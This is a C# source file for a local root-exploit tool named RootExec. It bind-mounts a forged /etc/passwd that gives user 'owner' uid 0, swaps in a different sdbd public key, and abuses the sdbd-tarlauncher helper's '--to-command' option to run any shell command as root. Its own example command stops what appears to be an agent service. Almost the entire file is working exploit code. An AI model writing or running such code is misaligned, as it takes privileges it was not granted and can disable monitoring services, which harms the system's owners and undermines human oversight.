using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

// Read-only-identity forge that runs one arbitrary shell command as root.
// Mirrors namespace-root-probe, but the --to-command is a caller-supplied
// shell command (e.g. "systemctl stop adagent-service") instead of a probe DLL.
class RootExec {
 const string ProbeName = "codex-namespace-proof";
 [DllImport("libc.so.6", SetLastError=true)] static extern int unshare(int flags);
 [DllImport("libc.so.6", SetLastError=true)] static extern int mount(string source,string target,string fs,UIntPtr flags,string data);
 [DllImport("libc.so.6", SetLastError=true)] static extern int umount2(string path,int flags);
 static void Require(string action,int rc){int e=Marshal.GetLastWin32Error();Console.WriteLine(action+" result="+rc+" errno="+(rc<0?e:0));if(rc<0)throw new Exception(action+" failed: "+e);}

 static int Main(string[] args){
  if(args.Length!=2) { Console.WriteLine("usage: RootExec <dir> <command>"); return 2; }
  string dir=args[0], command=args[1];
  if(dir!="/home/owner/share/tmp/sdk_tools/"+ProbeName || IntPtr.Size!=4) { Console.WriteLine("bad dir/arch"); return 2; }
  // Build the owner->root passwd view (same logic as namespace-root-probe).
  string original=File.ReadAllText("/etc/passwd");
  var lines=original.Split('\n'); int changed=0;
  for(int i=0;i<lines.Length;i++){var c=lines[i].Split(':');if(c.Length>=7&&c[0]=="owner"){if(c[2]!="5001")throw new Exception("unexpected owner uid");c[2]="0";c[3]="0";lines[i]=string.Join(":",c);changed++;}}
  if(changed!=1)throw new Exception("expected one owner record");
  File.WriteAllText(dir+"/passwd-view",string.Join("\n",lines));

  string archive="/home/owner/share/tmp/sdk_tools/on-demand/"+ProbeName+".tar.gz";
  bool key=false,passwd=false;
  try{
   Require("unshare private mount namespace",unshare(0x20000));
   Require("make mount propagation private",mount(null,"/",null,new UIntPtr(0x44000),null));
   Require("bind test public key",mount(dir+"/public.pem","/usr/share/sdbd/public.pem",null,new UIntPtr(4096),null));key=true;
   Require("bind owner record view",mount(dir+"/passwd-view","/etc/passwd",null,new UIntPtr(4096),null));passwd=true;
   Console.WriteLine("RUN ROOT COMMAND: "+command);
   var start=new ProcessStartInfo("/usr/sbin/sdbd-tarlauncher"){UseShellExecute=false,RedirectStandardOutput=true,RedirectStandardError=true};
   foreach(var arg in new[]{"--package_name",ProbeName,"-xzf",archive,"--to-command="+command})start.ArgumentList.Add(arg);
   using(var p=Process.Start(start)){
    var stdout=p.StandardOutput.ReadToEndAsync();var stderr=p.StandardError.ReadToEndAsync();
    if(!p.WaitForExit(30000)){p.Kill(true);throw new Exception("helper timeout");}
    Console.Write(stdout.Result);Console.Write(stderr.Result);
    Console.WriteLine("launcher exit="+p.ExitCode);
    if(p.ExitCode!=0)throw new Exception("helper did not complete");
   }
   return 0;
  }catch(Exception e){Console.WriteLine("ROOTEXEC STOPPED: "+e.Message);return 1;}
  finally{
   if(passwd)Console.WriteLine("unmount passwd view="+umount2("/etc/passwd",2));
   if(key)Console.WriteLine("unmount public key view="+umount2("/usr/share/sdbd/public.pem",2));
   Console.WriteLine("RootExec exiting; no service or shell left running.");
  }
 }
}
